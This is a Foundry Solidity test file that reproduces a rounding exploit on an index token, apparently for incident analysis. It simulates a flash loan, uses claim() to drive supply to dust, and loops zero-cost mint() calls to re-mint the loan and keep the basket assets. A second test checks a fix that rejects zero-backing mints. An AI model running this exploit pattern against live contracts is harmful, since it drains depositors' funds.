// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockToken} from "../../src/MockToken.sol";
import {BasketIndexToken} from "../../src/incidents/BasketIndexToken.sol";

/// Replicates the class of the Thetanuts legacy index token incident (June 2026):
/// the rounding half of the inflation story without the donation half. Drive supply to
/// near zero with claim(), then mint() rounds every basket requirement down to 0.
contract NearZeroSupplyMintTest is Test {
    MockToken btcPut;
    MockToken ethPut;
    BasketIndexToken index;

    address seeder = makeAddr("seeder");
    address lender = makeAddr("flash lender"); // holds most of the index supply
    address attacker = makeAddr("attacker");

    uint256 constant SUPPLY = 150_000e18; // index has 18 decimals
    uint256 constant RETAINED = 1e12; // 0.000001 index tokens stay with the seeder
    // basket components are 6-decimal tokens, like the option vault tokens in the incident
    uint256 constant BTC_BASKET = 50_000e6;
    uint256 constant ETH_BASKET = 25_000e6;

    function setUp() public {
        btcPut = new MockToken();
        ethPut = new MockToken();
        IERC20[] memory basket = new IERC20[](2);
        basket[0] = btcPut;
        basket[1] = ethPut;
        index = new BasketIndexToken(basket, false);

        // Seed the basket: 50,000 BTC-put and 25,000 ETH-put behind 150,000 index tokens.
        btcPut.mint(seeder, BTC_BASKET);
        ethPut.mint(seeder, ETH_BASKET);
        vm.startPrank(seeder);
        btcPut.approve(address(index), type(uint256).max);
        ethPut.approve(address(index), type(uint256).max);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = BTC_BASKET;
        amounts[1] = ETH_BASKET;
        index.seed(amounts, SUPPLY);
        // Almost all of the supply sits with a lending pool; a dust amount stays with the seeder.
        index.transfer(lender, SUPPLY - RETAINED);
        vm.stopPrank();
    }

    function test_claimToDust_thenMintForFree() public {
        // 1. "Flash loan": borrow the lender's entire index balance for the transaction.
        uint256 borrowed = index.balanceOf(lender);
        vm.prank(lender);
        index.transfer(attacker, borrowed);

        vm.startPrank(attacker);
        // 2. One claim() drains the basket to dust (1 wei of each 6-decimal component is
        //    left behind by rounding) and leaves supply at RETAINED, 0.000001 index tokens.
        index.claim(borrowed);
        assertEq(index.totalSupply(), RETAINED);
        assertLe(btcPut.balanceOf(address(index)), 1, "basket drained to dust");
        uint256 btcBefore = btcPut.balanceOf(attacker);

        // 3. mint() computes required = dust × amount / supply. For any amount below
        //    supply / dust that is 0, so the mint pulls nothing. Every free mint raises
        //    supply, which raises the next free amount: the doubling pattern of the real trace.
        uint256 minted;
        uint256 mints;
        while (minted < borrowed) {
            uint256 size = index.totalSupply() - 1;
            if (size > borrowed - minted) size = borrowed - minted;
            index.mint(size);
            minted += size;
            mints++;
        }
        console2.log("free mints needed       ", mints);
        assertEq(index.balanceOf(attacker), borrowed, "re-minted the full loan for free");
        assertEq(btcPut.balanceOf(attacker), btcBefore, "no basket tokens were pulled");

        // 4. Repay the loan with the unbacked tokens, keep the basket.
        index.transfer(lender, borrowed);
        vm.stopPrank();

        console2.log("attacker BTC-put tokens", btcPut.balanceOf(attacker));
        console2.log("attacker ETH-put tokens", ethPut.balanceOf(attacker));
        console2.log("index supply after      ", index.totalSupply());
        assertEq(btcPut.balanceOf(attacker), (BTC_BASKET * borrowed) / SUPPLY);
        assertEq(index.balanceOf(lender), borrowed, "lender made whole with unbacked tokens");
        assertLe(btcPut.balanceOf(address(index)), 1, "150,000 index tokens now backed by 1 wei of dust");
    }

    /// The one-line fix: reject a mint whose basket requirement rounds to zero.
    function test_fix_rejectZeroBackingMint() public {
        IERC20[] memory basket = new IERC20[](2);
        basket[0] = btcPut;
        basket[1] = ethPut;
        BasketIndexToken fixedIndex = new BasketIndexToken(basket, true);
        btcPut.mint(seeder, BTC_BASKET);
        ethPut.mint(seeder, ETH_BASKET);
        vm.startPrank(seeder);
        btcPut.approve(address(fixedIndex), type(uint256).max);
        ethPut.approve(address(fixedIndex), type(uint256).max);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = BTC_BASKET;
        amounts[1] = ETH_BASKET;
        fixedIndex.seed(amounts, SUPPLY);
        fixedIndex.claim(SUPPLY - RETAINED); // seeder plays attacker here
        assertLe(btcPut.balanceOf(address(fixedIndex)), 1);
        vm.expectRevert(bytes("ZERO_BACKING"));
        fixedIndex.mint(RETAINED - 1);
        vm.stopPrank();
    }
}
